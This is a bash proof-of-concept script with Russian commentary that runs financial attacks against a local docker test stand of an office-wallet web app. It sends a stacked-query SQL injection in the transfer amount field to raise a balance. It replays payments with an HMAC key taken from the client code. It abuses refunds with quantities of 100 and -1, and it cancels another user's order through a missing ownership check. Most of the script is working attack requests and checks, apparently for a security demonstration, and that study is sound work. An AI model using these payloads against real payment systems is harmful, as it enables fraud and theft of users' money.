#!/usr/bin/env bash
# stage_money.sh — «Деньги»: как напечатать, увести и повторить деньги.
#   sh poc/stage_money.sh
# Стенд должен быть поднят: docker compose up -d --build
# Пояснения к каждому шагу печатаются прямо в консоли, полные шаги — в poc/STEPS.md
. "$(dirname "$0")/lib.sh"

step "1. вход под рабочей учёткой"
if login_as ivanov workplace1; then ok "сессия получена"; else
  fail "не удалось войти, стенд поднят?"; exit 1; fi

step "2. SQL-инъекция в сумме: запись в базу мимо всего кода"
say "Поле amount_rub не парсится как число — и сервер выполняет его как SQL-запрос"
say "(handlers_money.go:172-180). lib/pq при Exec без параметров гоняет все команды"
say "подряд, поэтому в форму перевода вставляется любая правка в базе: балансы,"
say "роли, пароли, статусы. Ни одна проверка приложения между нами и базой не стоит."
B1=$(balance)
req "POST /transfer/new  recipient=petrova amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--" \
  -b "$JAR" -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--' \
  --data-urlencode 'memo=x' "$BASE/transfer/new" > /dev/null
B2=$(balance)
if [ "$B1" != "$B2" ]; then
  ok "баланс $B1 -> $B2 руб.: +5000₽ пришло из ничего, приложение их не считало"
else
  fail "баланс не изменился ($B1)"
fi
say "А если подзапрос вернёт строку — приведение к bigint упадёт, и текст ошибки"
say "с содержимым печатается прямо в форме. На этом же месте читаются все хеши"
say "(см. stage_data.sh, шаг 3)."

step "3. повтор платежа: подпись есть, а ограничений нет"
say "Подпись платежа — HMAC(константа PAYMENT_KEY, 'op:сумма:получатель'), ключ"
say "лежит в статике приложения (wallet.js). В подписи нет ни nonce, ни срока, ни"
say "привязки к сессии (handlers_money.go:368-401): проверяется только совпадение"
say "хеша. Значит одна и та же подпись проводит платёж сколько угодно раз, а поле"
say "to_login вообще меняет получателя мимо подписанного (строки 384-388)."
OP=$(db "SELECT id||' '||amount_kop||' '||to_user_id FROM operations WHERE to_user_id IS NOT NULL ORDER BY id LIMIT 1 OFFSET 1")
OPID=$(echo "$OP" | cut -d' ' -f1)
AMT=$(echo "$OP" | cut -d' ' -f2)
TO=$(echo "$OP" | cut -d' ' -f3)
PSIG=$(printf '%s:%s:%s' "$OPID" "$AMT" "$TO" | openssl dgst -sha256 -hmac 'office-wallet-pay-key' -hex | sed 's/.*= //')
info "операция #$OPID из базы: сумма $AMT коп, получатель $TO"
info "HMAC-SHA256(office-wallet-pay-key, '$OPID:$AMT:$TO') = ${PSIG:0:20}..."
R1=$(balance)
req "POST /pay/replay  op_id=$OPID&amount_kop=$AMT&recipient=$TO&sig=<подпись посчитана сама> (повтор 1)" \
  -b "$JAR" -X POST -d "op_id=$OPID&amount_kop=$AMT&recipient=$TO&sig=$PSIG" \
  "$BASE/pay/replay" > /dev/null
R2=$(balance)
req "POST /pay/replay  те же поля, та же подпись (повтор 2 — сервер не отличает)" \
  -b "$JAR" -X POST -d "op_id=$OPID&amount_kop=$AMT&recipient=$TO&sig=$PSIG" \
  "$BASE/pay/replay" > /dev/null
R3=$(balance)
ok "два повтора одной подписью: баланс $R1 -> $R2 -> $R3 руб."

step "4. возврат: печатаем и уводим деньги"
say "Возврат считается как refund = total × qty, а qty не ограничен ни количеством"
say "в заказе, ни суммой, ни знаком (handlers_shop.go:350-363): qty=100 печатает"
say "сотню стоимости заказа, qty=-1 уводит деньги — и то, и другое проводится,"
say "при отрицательном только пишется строка в anomaly_log, никто не реагирует."
ORD1=$(new_order "обычный заказ под возврат")
say "заказ #$ORD1 оформлен (450₽), делаем возврат с qty=100:"
R1=$(balance)
req "POST /orders/$ORD1/return  qty=100 (refund = 450₽ × 100)" \
  -b "$JAR" -X POST -d 'qty=100' "$BASE/orders/$ORD1/return" > /dev/null
R2=$(balance)
ok "qty=100: баланс $R1 -> $R2 руб. (+45000₽ из ничего)"
ORD2=$(new_order "второй заказ под отрицательный возврат")
say "заказ #$ORD2 оформлен, теперь qty=-1 — деньги уходят со счёта:"
R3=$(balance)
req "POST /orders/$ORD2/return  qty=-1 (refund = -450₽)" \
  -b "$JAR" -X POST -d 'qty=-1' "$BASE/orders/$ORD2/return" > /dev/null
R4=$(balance)
ok "qty=-1: баланс $R3 -> $R4 руб. (деньги уведены, возврат проведён)"

step "5. отмена чужого заказа: деньги идут его владельцу"
say "Отмена заказа: проверка владельца стоит только на показе страницы, на самом"
say "действии её нет (handlers_shop.go:304-329). Отменяет заказ кто угодно, а"
say "деньги возвращаются на счёт владельца — учёт и выдача рассинхронизируются."
FOR=$(db "SELECT id FROM orders WHERE user_id<>1 AND status IN ('paid','delivered') ORDER BY id LIMIT 1")
if [ -z "$FOR" ]; then
  say "чужого непогашенного заказа не осталось — создаём его напрямую в базе"
  say "(доступ к БД у нас из docker-compose.yml, пароль wallet/wallet):"
  info "→ INSERT INTO orders (user_id, status, total_kop, ...) VALUES (2, 'paid', 45000, ...)"
  FOR=$(db "INSERT INTO orders (user_id, status, total_kop, lines_json, item_comment) VALUES (2,'paid',45000,'[]','создан для проверки IDOR') RETURNING id")
  info "← psql: заказ #$FOR создан"
fi
OWNER=$(db "SELECT user_id FROM orders WHERE id=$FOR")
V1=$(db "SELECT balance_kop FROM users WHERE id=$OWNER")
info "заказ #$FOR принадлежит user_id=$OWNER, его баланс: $V1 коп"
req "GET /orders/$FOR  (просмотр чужого заказа — проверки владельца нет)" \
  -b "$JAR" "$BASE/orders/$FOR" | grep -o "Заказ #$FOR" | sed 's/^/    увидели: /'
req "POST /orders/$FOR/cancel  (отмена чужого заказа)" \
  -b "$JAR" -X POST "$BASE/orders/$FOR/cancel" > /dev/null
V2=$(db "SELECT balance_kop FROM users WHERE id=$OWNER")
order_status "$FOR" | sed 's/^/    статус в базе: /'
if [ "$V1" != "$V2" ]; then
  ok "баланс жертвы $V1 -> $V2 коп: деньги вернулись ей, а отменил заказ ivanov"
else
  info "баланс владельца не изменился ($V1) — видимо, заказ уже был не в paid"
fi
